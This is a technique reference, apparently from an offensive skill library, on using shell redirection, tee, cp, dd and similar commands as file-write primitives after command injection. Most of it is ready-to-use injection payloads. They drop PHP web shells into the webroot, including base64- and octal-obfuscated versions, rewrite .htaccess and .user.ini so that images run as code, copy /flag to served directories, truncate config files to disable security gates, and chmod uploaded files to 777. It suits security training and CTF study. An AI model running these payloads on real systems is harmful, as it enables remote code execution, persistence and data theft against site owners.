# Redirection Tricks — `>`/`>>`/`<`/tee as write primitives

## The redirect primitives

| Op | Action |
|---|---|
| `cmd > f` | stdout → file (truncate) |
| `cmd >> f` | append |
| `cmd 2> f` | stderr → file |
| `cmd &> f` | both (bash) |
| `cmd > f 2>&1` | both |
| `cmd < f` | stdin from file |
| `cmd <<< 'str'` | herestring |
| `cmd << EOF` | heredoc |
| `tee f` | stdout → file AND stdout |
| `> f` alone | truncate file to empty! |
| `< f` alone | open read — errors expose fs |

## Writing files through injection — the redirect write primitive

```
;echo '<?php system($_GET[c]);?>' > /var/www/html/x.php
;cat /flag > /uploads/f.txt
;id > /tmp/x
;base64 -d <<< 'PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==' > x.php
;printf 'x' > x
;cp /flag /uploads/f      — alternative write
;tee /uploads/x           — stdin→file
```

The `.htaccess`/`.user.ini`/web-config drop — `skills/web-file-upload/references/init-hooks.md`:

```
;echo 'AddType application/x-httpd-php .jpg' > /var/www/html/.htaccess
;echo 'auto_prepend_file=x' > /var/www/html/.user.ini
```

## The quoting problem inside redirects — preserving `<?php`

```
;echo '<?php eval($_GET[0]);?>' > x.php    — single quotes inside payload?
```

Payload contains `'` — echo it via `''` alternation or use `printf`/b64:

```
;echo PD9waHAgZXZhbCgkX0dFVFswXSk7Pz4=|base64 -d>x.php
;printf '\074\077php system(\047id\047);?\076' > x.php
```

B64 is cleanest — `encoding.md`.

## `>` alone — truncation-as-attack

`;> /app/config.php` — truncates config to zero bytes — breaks the app
or removes a security gate. `> file` with no command truncates. A
destructive primitive — use only where authorized.

## `< file` — read via redirect? 

`cat</flag` — no-space read (`char-restriction.md`). `< f cmd` puts f on
cmd's stdin.

## `2>&1`/`&>` — merging streams for exfil

`;id > /tmp/o 2>&1` — capture stderr too. `cmd &> /tmp/o` (bash).

## The `tee` write — needs write-permission

```
;id | tee /var/www/html/o
;echo x | tee /a /b /c   — write to many files
```

`tee -a` appends. `tee` is a write primitive when `>` is filtered —
`>` may be filtered while `tee` isn't.

## `dd`/`cp`/`install`/`rsync`/`scp` — alternative writes

```
;dd if=/flag of=/uploads/x
;cp /flag /uploads/x
;install -m644 /flag /uploads/x
;rsync /flag /uploads/x
;ln -s /flag /uploads/x   — symlink instead (serve-side must follow)
```

## The `mv`/`rename` — move the uploaded file into place

`;mv /tmp/x.php /var/www/html/x.php` — file-upload+rename = relocation.

## `chmod`/`chown` after write — exec bit

```
;chmod +x /uploads/x.sh
;chmod 777 /uploads/x.php
```

## The "write to a fetchable dir" constraint — target selection

The write must land where the web server serves it — the upload dir
itself is usually writable and mapped — prefer it:

```
;id > ${PWD}/x.txt             — cwd may BE the webroot
;cat /flag > /uploads/x.txt
;cat /flag > ../html/x.txt     — relative out of upload dir
;cat /flag > ../../html/x.txt
```

Path-guessing order: current dir (`$PWD`), `uploads/`/`files/`/`static/`/
`public/`/`www/`/`html/` siblings, `/var/www/html`, `/srv/http`.

## `>`'s interaction with noclobber — `>|` to force

`set -o noclobber` blocks `>` overwrite — `>|` forces. Rarely set in
non-interactive shells but exists.

## Falsifiers

- no write primitive (no redirect, no tee/cp/mv/dd) OR no fetchable dir
  OR FS readonly (`skills/web-file-upload/references/readonly-fs.md`)

## Output to record

- the write target + the fetch URL + verbatim evidence the write
  round-tripped
